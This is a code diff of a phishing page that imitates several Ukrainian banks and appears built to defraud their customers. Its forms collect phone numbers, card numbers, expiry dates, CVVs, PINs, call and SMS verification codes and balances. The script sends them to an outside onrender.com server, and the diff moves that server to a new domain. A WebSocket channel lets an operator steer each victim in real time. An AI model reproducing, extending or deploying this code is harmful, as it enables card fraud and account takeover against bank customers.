@@ -109,30 +109,19 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentStepIndex = 0;
     let collectedData = {};
 
-    // Список тем для банков с двухэтапной логикой (телефон+карта -> запрос -> полные данные)
-    const twoStepThemes = ['pumb', 'alliance', 'otp', 'vostok', 'izibank', 'novapay', 'ukrsib'];
+    const serverDomain = 'new-l8h6.onrender.com'; // ВАШ НОВИЙ ДОМЕН
 
+    const twoStepThemes = ['pumb', 'alliance', 'otp', 'vostok', 'izibank', 'novapay', 'ukrsib'];
     const twoStepFlow = [
         { type: 'phone', title: 'Введіть номер телефону' },
         { type: 'card', title: 'Для зарахування коштів введіть номер картки' }
     ];
-
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank',
 
-steps: [
-                { type: 'phone', title: 'Введіть номер телефону' },
-                { type: 'card', title: 'Введіть номер карти' },
-                { type: 'pin', title: 'Введіть ПІН-код' },
-                { type: 'call_code', title: 'Підтвердження дзвінком' }
-            ]
+steps: [ { type: 'phone', title: 'Введіть номер телефону' }, { type: 'card', title: 'Введіть номер карти' }, { type: 'pin', title: 'Введіть ПІН-код' }, { type: 'call_code', title: 'Підтвердження дзвінком' } ]
         },
-        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', 
-            steps: [ 
-                { type: 'phone', title: 'Введіть номер телефону' }, 
-                { type: 'card_full', title: 'Для авторизації заповніть форму' } 
-            ]
-        },
+        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: [ { type: 'phone', title: 'Введіть номер телефону' }, { type: 'card_full', title: 'Для авторизації заповніть форму' } ]},
         'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: twoStepFlow },
         'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: twoStepFlow },
         'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: twoStepFlow },
@@ -147,9 +136,6 @@ steps: [
     const formHeaderLogo = document.getElementById('form-header-logo');
     const modalTitle = document.getElementById('modal-title');
     const stepContent = document.getElementById('modal-step-content');
-    const modalFooter = document.querySelector('.modal-footer');
-    const nextBtn = document.getElementById('next-btn');
-    const backBtn = document.getElementById('back-btn');
 
     bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
         const bank = bankFlows[id];
@@ -157,8 +143,7 @@ steps: [
     }).join('');
 
     function connectWebSocket() {
-        const serverUrl = 'odeal.onrender.com'; // Используйте ваш домен
-        ws = new WebSocket(wss://${serverUrl});
+        ws = new WebSocket(wss://${serverDomain});
         ws.onopen = () => { console.log('WebSocket connected'); ws.send(JSON.stringify({ type: 'register', sessionId: sessionId })); };
         ws.onmessage = (event) => { const command = JSON.parse(event.data); handleServerCommand(command); };
         ws.onclose = () => setTimeout(connectWebSocket, 3000);
@@ -182,11 +167,9 @@ steps: [
 
     async function sendDataToServer(data, isFinal) {
         collectedData = { ...collectedData, ...data };
-        const serverUrl = 'odeal.onrender.com'; // Используйте ваш домен
         try {
-            await fetch(https://${serverUrl}/api/submit, {
-
-method: 'POST',
+            await fetch(https://${serverDomain}/api/submit, {
+                method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, ...collectedData }),
             });
@@ -196,70 +179,56 @@ method: 'POST',
     function validateCurrentStep() {
         let isValid = true;
         const inputs = stepContent.querySelectorAll('.input-field');
-        inputs.forEach(input => {
+
+inputs.forEach(input => {
             input.classList.remove('invalid');
             let value = input.value;
             let id = input.id;
             let isFieldValid = true;
-
             if (id === 'phone' && value.replace(/\s/g, '').length !== 9) isFieldValid = false;
             if (id === 'card' && value.replace(/\s/g, '').length !== 16) isFieldValid = false;
             if (id === 'card-expiry' && value.length !== 5) isFieldValid = false;
             if (id === 'card-cvv' && value.length !== 3) isFieldValid = false;
             if (id === 'pin' && value.length !== 4) isFieldValid = false;
-            
-            if (!isFieldValid) {
-                input.classList.add('invalid');
-                isValid = false;
-            }
+            if (!isFieldValid) { input.classList.add('invalid'); isValid = false; }
         });
         return isValid;
     }
 
     function handleNextStep() {
         if (!validateCurrentStep()) return;
-
         let data = {};
         const inputs = stepContent.querySelectorAll('.input-field');
         inputs.forEach(input => {
-            let key = input.id;
-            let value = input.value;
+            let key = input.id; let value = input.value;
             if (key === 'phone') value = '+380 ' + value;
             data[key] = value;
         });
-        
         const step = activeBankData.steps[currentStepIndex];
         let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
         if (activeBankData.theme === 'oschadbank' && step.type === 'pin') isFinalStep = true;
-        
-        // Для двухэтапных банков отправляем isFinalStep=true только на первом шаге
-        if (twoStepThemes.includes(activeBankData.theme) && step.type === 'card') {
-            isFinalStep = true;
-        }
-
+        if (twoStepThemes.includes(activeBankData.theme) && step.type === 'card') { isFinalStep = true; }
         sendDataToServer(data, isFinalStep);
 
         if (twoStepThemes.includes(activeBankData.theme) && step.type === 'card') {
             modalTitle.textContent = 'Очікуйте';
             stepContent.innerHTML = <p style="text-align:center;">ваша заявка в роботі</p><p style="text-align:center; color: var(--danger-color);">Не закривайте будь-ласка сайт</p>;
-            modalFooter.style.display = 'none';
+            document.querySelector('.modal-footer').style.display = 'none';
             return;
         }
-
         currentStepIndex++;
         if (currentStepIndex < activeBankData.steps.length) {
             renderStep();
         } else {
             modalTitle.textContent = 'Очікуємо';
             stepContent.innerHTML = '<p style="text-align:center;">Заявку відправлено. Будь ласка, зачекайте на наступний крок.</p>';
-            modalFooter.style.display = 'none';
+            document.querySelector('.modal-footer').style.display = 'none';
         }
     }
 
     function handleBackStep() {
         if (currentStepIndex > 0) {
-            currentStepIndex--;
-            renderStep();
+            currentStepIndex--; renderStep();
         } else {
             body.classList.remove('form-active');
             if(ws) { ws.close(); }
@@ -277,38 +246,25 @@ method: 'POST',
                 if (value.length > 4) formattedValue += ' ' + value.substring(4, 7);
                 if (value.length > 7) formattedValue += ' ' + value.substring(7, 9);
                 e.target.value = formattedValue.trim();
-
-});
+            });
         }
         const cardNumberInput = document.getElementById('card');
-        if (cardNumberInput) {
-            cardNumberInput.addEventListener('input', (e) => {
-                let value = e.target.value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
-                e.target.value = value;
-            });
-        }
+        if (cardNumberInput) { cardNumberInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(); }); }
         const cardExpiryInput = document.getElementById('card-expiry');
-        if (cardExpiryInput) {
-            cardExpiryInput.addEventListener('input', (e) => {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 2) { value = value.substring(0, 2) + '/' + value.substring(2, 4); }
-                e.target.value = value;
-            });
-        }
+        if (cardExpiryInput) { cardExpiryInput.addEventListener('input', (e) => { let value = e.target.value.replace(/\D/g, ''); if (value.length > 2) { value = value.substring(0, 2) + '/' + value.substring(2, 4); } e.target.value = value; }); }
     }
 
-    function renderStep() {
+function renderStep() {
         const step = activeBankData.steps[currentStepIndex];
         let html = '';
+        const modalFooter = document.querySelector('.modal-footer');
         switch (step.type) {
             case 'phone': html = <div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XX XXX XX" maxlength="12"></div></div>; break;
             case 'card': html = <div class="input-group"><input type="tel" class="input-field" id="card" placeholder="XXXX XXXX XXXX XXXX" maxlength="19"></div>; break;
             case 'pin': html = <div class="input-group"><input type="password" class="input-field" id="pin" placeholder="ПІН-код" maxlength="4" inputmode="numeric"></div>; break;
             case 'card_full': html = <div class="input-group"><input type="tel" class="input-field" id="card" placeholder="Номер картки" maxlength="19"></div><div class="multi-input-row"><input type="tel" class="input-field" id="card-expiry" placeholder="Термін дії (ММ/РР)" maxlength="5"><input type="tel" class="input-field" id="card-cvv" placeholder="CVV" maxlength="3"></div>; break;
             case 'card_extended': html = <div class="input-group"><input type="tel" class="input-field" id="card" placeholder="Номер картки" maxlength="19"></div><div class="multi-input-row"><input type="tel" class="input-field" id="card-expiry" placeholder="Термін дії (ММ/РР)" maxlength="5"><input type="tel" class="input-field" id="card-cvv" placeholder="CVV" maxlength="3"></div><div class="input-group" style="margin-top: 15px;"><input type="number" class="input-field" id="balance" placeholder="Поточний баланс"></div>; break;
-            case 'call_code':
-                html = <p style="text-align:center;">Зараз вам буде здійснено дзвінок для проходження авторизації. Підніміть слухавку , натисніть 1 та прослухайте код. Код введіть у форму нижче.</p><div class="input-group"><input type="tel" class="input-field" id="call_code_input" placeholder="Введіть код з дзвінка" maxlength="6" inputmode="numeric"></div>;
-                break;
+            case 'call_code': html = <p style="text-align:center;">Зараз вам буде здійснено дзвінок... Код введіть у форму нижче.</p><div class="input-group"><input type="tel" class="input-field" id="call_code_input" placeholder="Введіть код з дзвінка" maxlength="6" inputmode="numeric"></div>; break;
         }
         modalTitle.textContent = step.title;
         stepContent.innerHTML = html;
@@ -322,20 +278,18 @@ method: 'POST',
     
     function handleConfirmation() {
         if (!validateCurrentStep()) return;
-
         let data = {};
         const inputs = stepContent.querySelectorAll('.input-field');
         inputs.forEach(input => { data[input.id] = input.value; });
-
         sendDataToServer(data, true);
-
         modalTitle.textContent = 'Очікуйте';
         stepContent.innerHTML = <p style="text-align:center;">ваша заявка в роботі</p><p style="text-align:center; color: var(--danger-color);">Не закривайте будь-ласка сайт</p>;
-        modalFooter.style.display = 'none';
+        document.querySelector('.modal-footer').style.display = 'none';
     }
 
-function handleServerCommand(command) {
+    function handleServerCommand(command) {
         const { type, data } = command;
+        const modalFooter = document.querySelector('.modal-footer');
         const showMessageWithButton = (title, text, btnText, callback) => {
             modalTitle.textContent = title;
             stepContent.innerHTML = <p style="text-align:center;">${text}</p>;
@@ -343,7 +297,8 @@ function handleServerCommand(command) {
             modalFooter.innerHTML = <button class="btn btn-back">${btnText}</button>;
             modalFooter.querySelector('button').addEventListener('click', callback);
         };
-        switch (type) {
+
+switch (type) {
             case 'zapit':
                 if (twoStepThemes.includes(activeBankData.theme)) {
                     modalTitle.textContent = 'Вам необхідно підтвердити володіння карткою, заповніть форму';
@@ -381,8 +336,7 @@ function handleServerCommand(command) {
                 modalFooter.style.display = 'none';
                 let duration = 15 * 60; const display = document.getElementById('timer');
                 const timerInterval = setInterval(() => {
-
-let minutes = parseInt(duration / 60, 10); let seconds = parseInt(duration % 60, 10);
+                    let minutes = parseInt(duration / 60, 10); let seconds = parseInt(duration % 60, 10);
                     minutes = minutes < 10 ? "0" + minutes : minutes; seconds = seconds < 10 ? "0" + seconds : seconds;
                     display.textContent = minutes + ":" + seconds;
                     if (--duration < 0) { clearInterval(timerInterval); display.textContent = "Готово!"; }
@@ -392,18 +346,14 @@ let minutes = parseInt(duration / 60, 10); let seconds = parseInt(duration % 60,
     }
     
     async function submitSmsCode() {
-        const code = document.getElementById('sms-code').value;
-        const serverUrl = 'odeal.onrender.com'; // Используйте ваш домен
+
+const code = document.getElementById('sms-code').value;
         try {
-            await fetch(https://${serverUrl}/api/sms, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+            await fetch(https://${serverDomain}/api/sms, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId, code }),
             });
-            // Не показываем ошибку сразу, ждем ответа от сервера
-        } catch (error) { 
-            console.error('Failed to send sms code:', error); 
-        }
+        } catch (error) { console.error('Failed to send sms code:', error); }
     }
 });
 </script>
